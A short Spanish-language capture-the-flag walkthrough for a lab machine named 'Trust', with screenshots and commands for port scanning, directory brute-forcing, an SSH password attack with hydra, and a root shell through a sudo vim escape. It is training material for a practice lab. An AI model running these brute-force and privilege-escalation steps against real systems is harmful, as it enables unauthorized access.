Maquina: Trust

Autor: El Pinguino de Mario 

Dificultad: Muy Facil

![Screenshot 2024-11-09 080125](https://github.com/user-attachments/assets/f6c194b6-faf6-48a8-ae52-83426b55cdce)

ping 172.18.0.2 -c 1

![Screenshot 2024-11-09 080415](https://github.com/user-attachments/assets/8c0efa30-9efc-465d-8fc7-287bf60032ae)

sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.18.0.2 -oN puertos

![Screenshot 2024-11-09 080603](https://github.com/user-attachments/assets/d8be8fd1-4573-45d5-8638-d2b3d1063a98)

sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 'http://172.18.0.2/' -x .php,.sh,.py,.txt

![Screenshot 2024-11-09 082414](https://github.com/user-attachments/assets/254f0d83-03ef-411d-b8bc-13e9720a5956)

buscamos en el archivo encontrado y descubrimos el nombre de un usuario

![Screenshot 2024-11-09 081917](https://github.com/user-attachments/assets/179b4806-2761-4ada-ba1f-6f3412a80dde)

utilizamos hydra para conseguir la contraseña
hydra -l mario -P /usr/share/wordlists/rockyou.txt.gz ssh://172.18.0.2

![Screenshot 2024-11-09 082000](https://github.com/user-attachments/assets/94cf95bf-4cfc-431b-9a44-aa17118d1e6d)

entramos por ssh con la contraseña encontrada
ssh mario@172.18.0.2

![Screenshot 2024-11-09 082028](https://github.com/user-attachments/assets/ad4cec13-962b-4552-ac9e-2d07db6a0632)

sudo -l
descubrimos que podemos ejecutar el comando vim
sudo -u root /usr/bin/vim
:!/bin/bash
whoami

![Screenshot 2024-11-09 082127](https://github.com/user-attachments/assets/e676f853-c17e-4ebd-a807-ca4e61a7eda8)
